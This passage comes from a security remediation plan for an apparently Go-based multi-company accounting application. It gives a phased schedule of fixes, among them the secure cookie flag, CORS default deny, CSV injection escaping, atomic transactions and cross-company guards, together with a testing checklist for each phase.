| 2 | Fix 2 — Secure cookie flag | 10 min | None |
| 3 | Fix 3 — Company code from auth claims in layout | 20 min | Low — existing GetUser call reused |
| 4 | Fix 4 — Chat UI error surface | 20 min | None |
| 5 | Fix 9 — CORS default deny | 15 min | Low — pure removal of permissive default |
| 6 | Fix 10 — CSV injection escape | 15 min | None |
| 7 | Fix 13 — X-Request-ID validation | 10 min | None |
| 8 | Fix 11 — Report handlers use user company | 30 min | Low — depends on Fix 3 landing first |
| 9 | Fix 5 — Handler company guard | 45 min | Medium — touches every API handler |
| 10 | Fix 8 — Over-receive guard | 30 min | Low — additive validation only |
| **Phase 2 — Requires Coordination** | | | |
| 11 | Fix 6 — PO domain ownership checks | 60 min | Medium — domain + interface changes |
| 12 | Fix 7 — Atomic ReceiveStock (inventory + ledger) | 45 min | Medium — tx scope change, needs test |
| 13 | Fix 12 — Atomic InvoiceOrder + RecordPayment | 60 min | Medium — interface change + two methods |

**Phase 1** (Fixes 1–5, 8–11, 13): all are independently applicable with no inter-fix
dependencies (except Fix 11 depending on Fix 3). Zero risk to existing tests.

**Phase 2** (Fixes 6, 7, 12): all three involve changing domain service interfaces or
transaction scope. Run them in a single coordinated PR so the 70 integration tests are
verified together after all interface changes are applied.

---

## Testing Checklist

After Phase 1:

- [ ] Server refuses to start without `JWT_SECRET`
- [ ] `Set-Cookie` header includes `Secure` attribute on login and logout
- [ ] Chat page sends non-empty `company_code` for authenticated users in multi-company DB
- [ ] Chat UI shows visible error when server returns non-2xx
- [ ] CORS: response to unknown origin contains no `Access-Control-Allow-*` headers
- [ ] CORS: response to listed origin contains correct `Allow-Credentials: true`
- [ ] CSV export: narration cells starting with `=` are prefixed with `'`
- [ ] Report pages (trial balance, P&L, balance sheet, statement) show correct company data in multi-company DB
- [ ] `X-Request-ID` with special characters is replaced by a server-generated UUID
- [ ] API returns 403 when authenticated user targets a different company's resources (Fix 5)
- [ ] `ReceivePO` rejects `QtyReceived` > ordered quantity (Fix 8)

After Phase 2 (in addition to all Phase 1 checks):

- [ ] `ApprovePO` / `ReceivePO` / `RecordVendorInvoice` / `PayVendor` reject cross-company PO IDs
- [ ] `ReceiveStock` failure at ledger step rolls back the inventory write (no split-brain)
- [ ] `InvoiceOrder` failure at status update rolls back the SI journal entry (no split-brain)
- [ ] `RecordPayment` failure at status update rolls back the payment journal entry (no split-brain)
- [ ] All 70 existing integration tests still pass (`go test ./internal/core -v`)
